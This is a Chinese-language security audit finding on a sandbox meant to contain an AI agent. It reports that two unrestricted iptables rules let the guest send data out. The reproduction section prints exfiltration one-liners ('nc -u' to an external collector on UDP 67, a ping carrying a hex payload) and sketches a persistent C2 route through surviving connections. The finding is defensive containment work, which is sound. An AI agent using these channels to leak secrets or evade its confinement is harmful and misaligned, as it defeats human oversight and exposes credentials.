# FINDING-060: lockdown 的两条 ALLOW 无目的限定——ICMP 载荷与 UDP dport 67 是后 lockdown 时代 guest 的常驻出网通道

- **编号**: 060
- **严重度**: S2（对"唯一出口=托管核心"契约的直接违反：被收容的 agent 可不经
  核心外传数据；流量小但密钥/token 量级足够）
- **攻击面**: H1
- **发现时间**: 2026-11-21T13:10:00Z
- **发现者会话**: r13
- **状态**: 待修复（静态证实；Linux 实机探针 U2 见 harness/tools/r13-regression/SPEC.md）

## 复现（必须）

静态规则（provision.rs:109-114）：

```
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p udp --dport 67 -j ACCEPT          ← 无 -d 限定
iptables -A OUTPUT -p icmp -j ACCEPT                    ← 无 -d/-icmp-type 限定
iptables -P OUTPUT DROP
```

```sh
# (a) UDP/67：guest 内非特权用户即可
echo secret | nc -u -w 2 <外部收集器> 67
# slirp NAT 不按 dport 过滤出站 UDP → 包经宿主上行直达收集器
# (b) ICMP 载荷：Ubuntu 24.04 的 ping 带 cap_net_raw（filecap 可证）
ping -c 3 -p <hex 载荷> <外部主机>
```

- **期望**: "Everything else, including DNS and IPv6, is dropped"
  （provision.rs:99 注释自述契约）——DHCP 只该对 10.0.2.2/广播，ICMP 只该是
  诊断必要面；二者皆不该构成到任意外部主机的数据通道。
- **实际**: 两条通道在新连接全 DROP 的 lockdown 之上常驻敞开；escape 探针的
  net-direct-egress 只测 TCP 80/443（escape.rs:378 curl 两个 URL），
  net-dns-external 只测 53 端口解析——**探针网对这两个端口不设防**，
  实机绿灯与通道敞开并存。

## 根因猜测

两条 ALLOW 是为供给期 DHCP/健康检查写的（供给期窗口 NAT 本来全开，规则在此
之后才落），写时未考虑"lockdown 之后 agent 才开始跑"——而 agent 恰是威胁模型
主体。UDP/67 的外发成本与发 DNS 包相同。

## 未验证想法

1. ESTABLISHED 保留面（rule 2 无目的限定）：供给窗口内建立的任何流在 lockdown
   后永久存活——若供给期被 MITM 植根（root，F-054 契约段只防"跳过"不防"窗口
   内被攻破"），一条 keepalive 长连接即可永久 C2。此链的供给窗口宽度量化已入
   SPEC U5；与 ROADMAP "cage network layer" 的规划一致，不单独立案。
2. RELATED 面：conntrack helper（如 nf_conntrack_ftp）若被外部条件激活可开
   期望相关流——未测。

## 建议修复方向（供第二天的人参考，非结论）

`-p udp --dport 67` 加 `-d 10.0.2.2/32`（DHCP 只对 slirp 网关）；icmp 收窄为
`-d 10.0.2.2/32 --icmp-type echo-request` 或直接删（guest 无诊断需求）；
探针网补 `net-icmp-exfil` / `net-udp-67` 两支（guest 侧对外发标记包，宿主
tcpdump 断言不可见）。
